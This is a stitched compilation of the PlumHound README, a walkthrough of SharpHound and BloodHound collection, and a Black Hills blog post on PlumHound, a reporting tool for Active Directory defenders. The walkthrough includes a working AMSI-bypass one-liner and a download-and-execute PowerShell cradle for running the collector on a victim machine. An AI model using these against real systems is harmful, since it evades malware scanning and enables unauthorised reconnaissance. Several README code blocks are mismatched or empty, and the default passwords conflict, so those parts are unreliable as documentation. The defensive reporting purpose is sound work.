# PlumHound - BloodHoundAD Report Engine for Security Teams

[](https://github.com/PlumHound/PlumHound#plumhound---bloodhoundad-report-engine-for-security-teams)

Released as Proof of Concept for Blue and Purple teams to more effectively use BloodHoundAD in continual security life-cycles by utilizing the BloodHoundAD pathfinding engine to identify Active Directory security vulnerabilities resulting from business operations, procedures, policies and legacy service operations.

PlumHound operates by wrapping BloodHoundAD's powerhouse graphical Neo4J backend cypher queries into operations-consumable reports. Analyzing the output of PlumHound can steer security teams in identifying and hardening common Active Directory configuration vulnerabilities and oversights.

## Release and call to Action

[](https://github.com/PlumHound/PlumHound#release-and-call-to-action)

The initial PlumHound code was released on May 14th, 2020 during a Black Hills Information Security webcast, A Blue Teams Perspective on Red Team Tools. The webcast was recorded and is available on YouTube. [A Blue Team's Perspective on Red Team Tools](https://youtu.be/0mIN2OU5hQEs).

The PlumHound Framework yields itself to community involvement in the creation and proliferation of "TaskLists" (work) that can be shared and used across different organizations. TaskLists contain jobs for PlumHound to do (queries to run, reports to write). A second PlumHound community repo has been created to allow for the open sharing of TaskLists (see [Plumhound-Tasks](https://github.com/DefensiveOrigins/PlumHound-Tasks))

## Background

[](https://github.com/PlumHound/PlumHound#background)

A client of ours working on hardening their Active Directory infrastructure asked us about vulnerabilities that can be found by using BloodHound. They had heard of the effectiveness of BloodHoundAD in Red-Team's hands and was told that BloodHound would identify all types of security mis-alignments and mis-configurations in their Active Directory environment. We helped them through analysis of their BloodHound dataset and it became quickly evident that BloodHoundAD's pathfinding graphical database was not designed for the fast-passed analytical security team accustom to reading reports and action items.

In fact, one of our cypher queries determined that 96% of their 3000 users had a path to Domain Admin with an average of just 4 steps. However, that graphical query rendered over 10,000 paths to Domain Admin. Finding the actual cause of the short-paths to DA wasn't as easy as just loading data into BloodHound or putting Cobalt Strike on Auto-Pilot with BloodHound Navigation.  
Hence, PlumHound was created out of a need to retrieve consumable data from BloodHoundAD's pathfinding engine. Data that could yield itself to inferring actionable work for security teams to harden their environments.

## Sample Reports

[](https://github.com/PlumHound/PlumHound#sample-reports)

We include some sample reports in this respository, however the data represents a fictious small Active Directory deployment atypical of a production environment. The default tasks tasklist will produce reports with ease. Here are a sample of some less-exciting reports generated from a small lab environment. A few samples of produced reports are shown below.

The archive of sample reports is found here: [SampleReports](https://github.com/PlumHound/PlumHound/raw/master/docs/SampleReports.zip)

# PlumHound Examples

[](https://github.com/PlumHound/PlumHound#plumhound-examples)

Use the default username, password, server, and execute the "Easy" task, to test connectivity. This will output all Active Directory user objects from the Neo4J database.

```shell
python3 PlumHound.py --easy
```

## Default Task List and Default Credentials

[](https://github.com/PlumHound/PlumHound#default-task-list-and-default-credentials)

Execute PlumHound with the Default TaskList using Default Credentials (neo4j:neo4jneo4j) and Database.

```shell
python3 PlumHound.py -x tasks/default.tasks
```

## Default Task List, Specified Neo4j Server and Quiet Output

[](https://github.com/PlumHound/PlumHound#default-task-list-specified-neo4j-server-and-quiet-output)

The same, but quiet the output (-v 0), specify the Neo4J server, username, and password instead of using defaults.

```shell
python3 PlumHound.py -x tasks/default.tasks -s "bolt://127.0.0.1:7687" -u "neo4j" -p "neo4jneo4j" -v 0
```

## Path Analyzer (BlueHound Module)

[](https://github.com/PlumHound/PlumHound#path-analyzer-bluehound-module)

### Option #1

[](https://github.com/PlumHound/PlumHound#option-1)

Using label. The supported labels are `User`, `Group`, `Computer`, `OU` and `GPO`. This function will assume the target group is "DOMAIN ADMINS".

```shell
python3 PlumHound.py -ap user
```

**NOTE:** The above syntax implies you are using the default values for `sever`, `user` and `password` or that you have hard-coded them in the script.

### Option #2

[](https://github.com/PlumHound/PlumHound#option-2)

specify `start node` and `end node` 

```shell
python3 PlumHound.py -ap "domain users@example.com" "domain admins@example.com"
```

**NOTE:** To use BlueHound Path Analyzer logic you need to get a copy of the Python script from [https://github.com/scoubi/BlueHound](https://github.com/scoubi/BlueHound)

## Busiest Path (BlueHound Module)

[](https://github.com/PlumHound/PlumHound#busiest-path-bluehound-module)

The Busiest Path(s) function takes two parameters

### Busiest Shortest Path to DA

[](https://github.com/PlumHound/PlumHound#busiest-shortest-path-to-da)

Find the shortest path that give users Domain Admin (top 5)

```
PlumHound.py -bp short 5
```

### Busiest All Path to DA

[](https://github.com/PlumHound/PlumHound#busiest-all-path-to-da)

Find the busiest path irregardless of length (top 5) to give users Domain Admin

```
HTML:
  Options for HTML Output (For single queries or TaskLists

  --HTMLHeader HTMLHEADER
                        HTML Header (file) of Report
  --HTMLFooter HTMLFOOTER
                        HTML Footer (file) of Report
  --HTMLCSS HTMLCSS     Specify a CSS template for HTML Output
```

|Argument/Parameter|Default|

|HTMLHeader|templates/head.html|
|HTMLFooter|templates/tail.html|
|HTMLCSS|templates/html.css|

|Variable|Output|
|---|---|
|--------PH_TITLE-------|Report Tile from --Title or TaskList/Job|
|--------PH_DATE-------|Python date.today()|

This allows the HTML output to be dynamic and tailored to your specification.

# TaskList Files

[](https://github.com/PlumHound/PlumHound#tasklist-files)

The PlumHound Repo includes a sample TaskList that exports some basic BloodHoundAD Cypher queries to an HTML Report. The included tasks\Default.tasks sample shows the basic syntax of the TaskList files. The TaskList Files allow PlumHound to be fully scripted with batch jobs after the SharpHound dataset has been imported not BloodHoundAD on Neo4j. Looking for more tasks and templates? Checkout [PlumHound-Tasks](https://github.com/DefensiveOrigins/PlumHound-Tasks) for the community driven marketplace of PlumHound reporting taskslists and report designs.

## TaskList File Syntax

[](https://github.com/PlumHound/PlumHound#tasklist-file-syntax)

The TaskList file syntax is as follows. Note that any cypher query containing a double quote must be modified to use a single quote instead of double.

```
["Report Title","[Output-Format]","[Output-File]","[CypherQuery]"]
```

Output-Format options for TaskLists:

- **HTML**: Generates a HTML Report
- **CSV**: Generates a CSV of data
- **HTMLCSV**: Generates both an HTML report and CSV data.
    - NOTE: DO not include a file-extension in the Output-File paramter.

Additional Modules in TaskLists:

- Report Index: to use the Report-Index module in a TaskList, use CypherQuery "REPORT-INDEX"

## TaskList Sample: default.tasks

[](https://github.com/PlumHound/PlumHound#tasklist-sample-defaulttasks)

The default.tasks file includes multiple tasks that instruct PlumHound to create reports using the specified "HTML" output format, output filename, and specific BloodHoundAD Neo4JS cypher Query. See the Tasks mode below in the Execution modes section for additional information.

```
PlumHound.py -x tasks/default.tasks
```

# Execution Modes

[](https://github.com/PlumHound/PlumHound#execution-modes)

There are multiple execution modes to get PlumHound to do work.

- Tasks Mode
- Single Query Mode
- BusiestPath Mode (BlueHound Module)
- AnalyzePath Mode (BlueHound Module)

## Tasks Mode

[](https://github.com/PlumHound/PlumHound#tasks-mode)

By specifying a task list, PlumHound can be programmed to run multiple cypher queries and export to multiple formats. For more information on the tasks file, see the section above.

[![](https://github.com/PlumHound/PlumHound/raw/master/docs/images/ph14.gif)](https://github.com/PlumHound/PlumHound/blob/master/docs/images/ph14.gif)

## Single Query Mode

[](https://github.com/PlumHound/PlumHound#single-query-mode)

This mode allows you to run a single query and export to standard output, HTML, or CSV.

### Single Query with Standard Output (Normal Verbosity)

[](https://github.com/PlumHound/PlumHound#single-query-with-standard-output-normal-verbosity)

```
PlumHound.py -q "MATCH (n:User) RETURN n.name, n.displayname LIMIT 10"

```

### Single Query with Standard Output (Quiet)

[](https://github.com/PlumHound/PlumHound#single-query-with-standard-output-quiet)

By turning the verbosity to zero, this can act as a direct Neo4J handler for queries.

```
PlumHound.py -q "MATCH (n:User) RETURN n.name, n.displayname LIMIT 10" -v 0
on 1:
on 1: n.name                    n.displayname

on 1:
         Executing Tasks |██████████████████████████████████████████████████| Tasks 1 / 1  in 0.2s (4.33/s)

```

The single query can also be used to generate HTML reports instead of outputting to STDOUT.

```
PlumHound.py -q "MATCH (n:User) RETURN n.name, n.displayname LIMIT 10" --title "Domain Users (Limit 10)" --of "DomainUserstest.html" --op "reports//" --ox HTML
```

## Busiest Path (BlueHound Module)

[](https://github.com/PlumHound/PlumHound#busiest-path-bluehound-module-1)

The Busiest Path(s) function takes two parameters 1- `all` or `short` either you want to use `shortestpath` or `allshorteshpaths` algorithym. 2- The number of results you want to return. ex: Top 5

```
PlumHound.py -bp short 5

[49, 'IT00333@BTV.ORG']
[*]Tasks Generation Completed
Tasks: []
```

## Analyze Path (BlueHound Module)

[](https://github.com/PlumHound/PlumHound#analyze-path-bluehound-module)

The Analyze Path takes either a `label` or a `start node` and `end node` and loop through all the paths finding which relationship(s) need to be broken in order to break the whole path. This is useful when you want to provide your AD Admins with concrete actions they can take in order to improuve your overall AD Security Posture.

```

# BloodHound + PlumHound = ❤

BloodHound is a graphical tool both attackers and defenders use to reveal secrets and hidden relationships within an Active Directory environment. In this case, though BloodHound is used for identifying and eliminating attack paths for Blue Teams, it is also used by Red Teams and malicious APT groups to discover hidden tracks for lateral movement in an Active Directory domain.

# 1. SharpHound

In order to graph data via BloodHound, SharpHound should be executed on the victim machine for data collection regarding the information in an Active Directory domain. SharpHound is the official data collector for BloodHound and can be found as both in PowerShell script and C# (compiled to .exe).

Without any flags given to SharpHound, the information below can be collected into a zip file:

- Security group memberships
- Domain trusts
- Abusable rights on Active Directory objects
- Group Policy links
- OU tree structure
- Several properties from computer, group and user objects
- SQL admin links
- The members of the local administrators, remote desktop, distributed COM, and remote management groups
- Active sessions, which SharpHound will attempt to correlate to systems where users are interactively logged on

More information can be found in the official document site of BloodHound: [https://bloodhound.readthedocs.io/](https://bloodhound.readthedocs.io/)

P.S. Firstly, some AMSI-Bypass won’t hurt if these below don’t work. Check out [https://amsi.fail/](https://amsi.fail/) and my teammate F’s fav (Hey [ZemarKhos](https://github.com/ZemarKhos) 🙌):

$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};$d=$c.GetFields(‘NonPublic,Static’);Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

Method 1: SharpHound can be downloaded on the attacker machine as “SharpHound.ps1”, imported and executed with the Collection Method of “all” for the most information about the domain.

powershell -ep bypass. .\Sharphound.ps1Invoke-Bloodhound -CollectionMethod All -Domain <DOMAIN_NAME>

![](https://miro.medium.com/v2/resize:fit:624/1*05bybHPY_jnP9ojrz3Sm2w.png)

**Method 2:** SharpHound can be downloaded and executed in the victim machine with an example oneliner below:

powershell -ep bypass "IEX(New-Object Net.Webclient).DownloadString('[https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1](https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1)');Invoke-Bloodhound"

![](https://miro.medium.com/v2/resize:fit:700/1*Lvhkqx_txs5xrqvXbo1M5g.png)

The output zip file should be uploaded to the attacker machine for further investigation of the related domain.

# 2. BloodHound

The output zip file which was downloaded earlier should be imported to BloodHound. BloodHound can be downloaded in Linux machines with the commands below:

apt install bloodhoundneo4j console  // Open the console on your browser.   username: neo4j   password: neo4j  // Asks you to change the password.bloodhound   username: neo4j   password: <new password>

The output zip file can be imported from “Upload Data” button on the right of the BloodHound GUI screen.

![](https://miro.medium.com/v2/resize:fit:138/1*O0W1AmzijttVCkl7LQkMSA.png)

After the upload completes, pre-build queries and their graphs can be observed:

![](https://miro.medium.com/v2/resize:fit:343/1*cbkA-Ix9q136zi0Jf6PO8w.png)

An example from the demonstration can be seen below:

![](https://miro.medium.com/v2/resize:fit:626/1*MaNK5SSCBKdCepJKuQ8UdQ.png)

# 3. PlumHound

Although BloodHound is a powerful tool to graph Active Directory, it can be mind-bending to correlate between information on maps of large networks… like, you know... like this:

![](https://miro.medium.com/v2/resize:fit:383/1*qdxB7QL1YTTrwTd7j9sRZQ.png)

To end the confusion over graphs, a new tool was introduced: PlumHound. PlumHound, which was essentially written for Blue and Purple Teams, operates by wrapping BloodHoundAD’s Neo4J backend cipher queries into reports. Blue and Purple Teams can identify and harden Active Directory configuration vulnerabilities by analyzing the output reports of PlumHound.

A collection output of SharpHound and an operating BloodHound should be active to generate reports with PlumHound. Installation and usage can be found below:

git clone [https://github.com/PlumHound/PlumHound](https://github.com/PlumHound/PlumHound)apt-get install python3cd PlumHoundpip3 install -r requirements.txtpython3 PlumHound.py -x tasks/default.tasks -s "bolt://127.0.0.1:7687" -u "neo4j" -p "<password>" -v 0 --HTMLCSS template/html.css

All reports can be accessed from the directory: “PlumHound/reports/Reports.html”

Reports include (a long list I cannot write!):

- Domain Users
- Domain Controllers
- Kerberoastable Users
- RDPable Servers
- Unconstrained Delegation Computers with SPN
- Admin Groups
- RDPable Groups
- RDPable Groups Count
- LocalAdminGroups

Screenshots of the report samples from the demonstration can be seen below:

# [PlumHound Reporting Engine for BloodHoundAD](https://www.blackhillsinfosec.com/plumhound-reporting-engine-for-bloodhoundad/)

[Kent Ickler](https://twitter.com/KRelkci) //

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/BLOG_chalkboard_00606-1024x576.jpg)

It’s been over two years since Jordan and I talked about a Blue Team’s perspective on Red Team tools.  

[A Blue Team’s Perspective on Red Team Hack Tools – YouTube](https://www.youtube.com/watch?v=0mIN2OU5hQE) 

The webcast itself had interesting topics; at the end of the discussion, we talked about a tool we wrote. PlumHound is a report engine for BloodHoundAD to make actionable reports for Blue Teams, Systems Administrators, and Analysts. We figured it’s about time we got around to writing this blog. 

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture3.png)

The framework for PlumHound is relatively simple: utilize the control path-finding capabilities of BloodHoundAD in Neo4j to build actionable intelligence for blue teams to identify Active Directory problems.   

A while into development, we ran into Mathieu Saulnier ([Scoubi](https://github.com/Scoubi)) who had a similar project. Finding similar objectives, we merged our efforts. Mathieu brought in additional modules that would identify the weakest link (AnalyzePath) to a control path vulnerability and the most important paths to remediate first (BusiestPath) to be most effective— both modules of his BlueHound project.

On pentests where we found interesting control path vulnerabilities, we took a few moments to analyze the condition and, if it was something new, write a new PlumHound report using Neo4j cyphers. Meanwhile, other information security teams began to use the report engine to build their own reports as well. 

Today, we have 69 PlumHound reports in the packaged “Default” reports, plus the Busiest Path and Analyze Path functions of Mathieu Saulnier’s BlueHound. 

### ****So, how does it all work?****

First off, we have to acknowledge that we stand on the shoulders of the giants that built Neo4j, BloodHoundAD, and its data collectors. With that said, PlumHound uses Python to connect to the Neo4j database after BloodHoundAD has ingested and parsed data. PlumHound then uses Neo4j’s cypher language to query its database for information and output that information into CSV or HTML reports (or, alternatively, to standard output). That is, the BloodHoundAD analysis can be normalized into a reporting format that can be consumed for data-driven decision making about correcting common Active Directory control path vulnerabilities. 

#### Running PlumHound Report Engine 

Running PlumHound is easy: specify the Neo4j database connection and specify the “task-list” you want to do. Task-lists are sets of cypher queries and metadata that tell PlumHound what query to run and how to generate a report from the output. The “Default” task-list included with PlumHound includes 69 reports plus an index. 

To shorthand things even further, if your Neo4j server is on localhost, you won’t need to specify a Neo4j connection.  

For versions of Neo4j that still use “default” credentials, you must first update the default credentials to use the service. If you’re like me, you source-filter the Neo4j service and update credentials to be something… easy… lazy… terrible?  Anyway, I change the password from “neo4j” to “neo4jj” because source-filter the service. Remember, if you source-filtered the service, you will need to run PlumHound from that trusted source. 

 If your username is “neo4j” and your updated password is “neo4jj”, you won’t need to specify your username and password to connect to the Neo4j database, because the default is “neo4jj”. 

#### It’s as simple as:

That will execute the default included task-list.   

`PlumHound.py -x tasks/default.tasks` 

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture4.png)

That’s it, 69 PlumHound reports + a report index are ready for your review, nice! 

##### ****Task Files**** 

The TaskList files allow PlumHound to be fully scripted with batch jobs after the SharpHound dataset has been imported not BloodHoundAD on Neo4j. The TaskList file syntax is as follows. (Note that any cypher query containing a double quote must be modified to use a single quote instead of double.)

`["Report Title","[Output-Format]","[Output-File]","[CypherQuery]"]` 

### **What reports are packaged in the default list?**   

The “default.tasks” instructs PlumHound to also generate an index of all the produced reports, index.html.   

Opening the index.html file shows us the list of reports. The reports start out pretty typical and provide a general report-based picture of the Active Directory environment.  

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture5.png)

Then, our first interesting set of reports. Our test database we used isn’t super interesting, but each of the reports below provide information that, as penetration testers, we use to find a foothold or escalate privileges on the network. Of course, as a Blue Teamer, we’d recommend thinking critically about each of the items in these reports.  

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture6.png)

Next up, reports that tell us if common or overly-used groups have been potentially mistakenly provided Active Directory delegation. In the group below, PasswordResetter groups let us know that a group has been delegated to reset passwords and will count how many users are delegated to the group.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture7.png)

Next up, reports regarding the domain’s GPOs and analysis of the GPO owners. Then RDP groups that tell us if RDP access is provisioned via groups and which groups provide access to a count of systems. 

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture8.png)

Then, reports of Kerberoastable users with the most privileges and an analysis of Local Administrators.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture9.png)

And onto reports about Computer Objects, Operating Systems, and LAPS Deployments. 

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture10.png)

After computers, we look at user accounts. We report all identified user sessions and users with multiple sessions on different systems. We then look at user accounts with old passwords. We look at users with vulnerable “userpassword” attributes and users with no Kerberos pre-authentication needed. We also have reports of users with administrative control of a system both directly and indirectly. Users with “Add To Group Delegation” tell us which users have been delegated to change group membership – both directly and indirectly. We report on users that have never logged in, and finally, users that are never required to change their passwords. 

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture11.png)

Finally, we have reports that are populated by the user of BloodHoundAD’s “Owned” flags, allowing an analyst to produce detailed reports of post-exploitation, defining exactly which user and computer accounts were compromised during an engagement.  

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture12.png)

#### Cyphers Included 

Each of the produced reports includes the cypher query used to generate the report. While useful for troubleshooting and developing the reports, it also allows the analyst the ability to utilize the cypher query as an ingest to other tooling.   

In the below report, “GPO Creators Owners”, we see that [ASADMIN@ASAZLAB.com](mailto:ASADMIN@ASAZLAB.com) is a GPO Creator/Owner. Included in the report are the date and time the report was executed, as well as the cypher query used to generate the report. 

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture13.png)

#### How do analysts use these reports?  

A penetration tester can find quick information – for example: what user accounts don’t require a password change but have also ever been an admin? The “User Password Never Expires Exception” report will tell us just that by checking the “AdminCount” column. 

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture14.png)

A defensive or Blue Team analyst can also use the same reports but with the objective of identifying vulnerable configurations to be remedied. 

#### **Single Queries**

PlumHound’s interface with Neo4j also means that you can quickly and easily execute cypher queries and output directly to the console. In the below example, we query for users that never require a password change. 

`./PlumHound.py -q "MATCH (n:User) WHERE n.pwdneverexpires RETURN n.name as Name,n.displayname as DisplayName,n.enabled as Enabled, n.title as Title, n.pwdneverexpires as PWDNeverExpires, n.passwordnotreqd as PWDNotReqd, n.admincount as AdminCount"` 

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture15.png)

Even more task-lists

PlumHound also includes other task-lists that are more specific to looking for specific data. For example, we’ve bundled Kerberoasting specific reports into its own task-list.  We’ve produced a task-list to generate CSV reports instead of HTML. We also have a task-list that will hunt for interesting things, such as passwords in description, or comment attributes of Active Directory objects. 

#### **Analyze Path (BlueHound Module)** 

The Analyze path function allows us to identify what relationship to break to stop a control path vulnerability. The command syntax is simple: use flag -ap and specify either user, group, computer, ou, or GPO as a start to the path analysis. 

`./PlumHound.py -ap user` 

In the below screenshot, user DataAnalyst@asazlab.com has a path to OU “AdminAccounts”. The output below details the path.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture16.png)

For those more familiar with BloodHound’s GUI, this is the same representation as below, but indicating the specific relationships to break.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture17.png)

The AnalyzePath query will effectively produce a kill-chain for every vulnerable path by user, group, computer, OU, or group. 

#### **Busiest Path (BlueHound Module)** 

The Busiest Path finds the shortest (or all) paths that give the most users a path to Domain Admin and gives us number of affected users. The most “busiest path” is listed first. This informs a team tasked with remediating path vulnerabilities information about which paths to start remediating first to most effectively use their time and effort. 

In the case below, we search for the top 5 most user-affected shortest paths to Domain Admin.  

`./PlumHound.py -bp short 5` 

 The first path described below affects six users and is a path starting from group USR_Helpdesk@asazlab.com to Domain Admins 

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture18.png)

We can see the path in BloodHoundAD by using the control-paths search:  

![](https://www.blackhillsinfosec.com/wp-content/uploads/2022/12/Picture19.png)

### **Verbosity As a Feature?** 

This tool was made by someone who doesn’t write code for a living, or at least not full-time. As a clutch for not writing in a debug IDE, I’ve written in a function that causes the PlumHound tool to have a very configurable debug verbosity. This helps the process of testing cypher queries and writing task lists.   

The verbosity argument for PlumHound is -v (number). The verbose number can be 0-1000, where “0” is quiet and 1000 produces a message on every crucial step of the PlumHound process, somewhere in between is just that. Too verbose? Reduce your -v setting. Not enough?  Increase it. In addition to this, verbose logging is also configured to review prior logs generated by the tool. 

### **Check out PlumHound for Yourself** 

We invite you to checkout the PlumHound report engine. We’ve built it open-source to help administrators and analysts make the most of BloodHoundAD’s control path analysis. 

 If you find a useful cypher query you want added, let us know, or make a pull request.
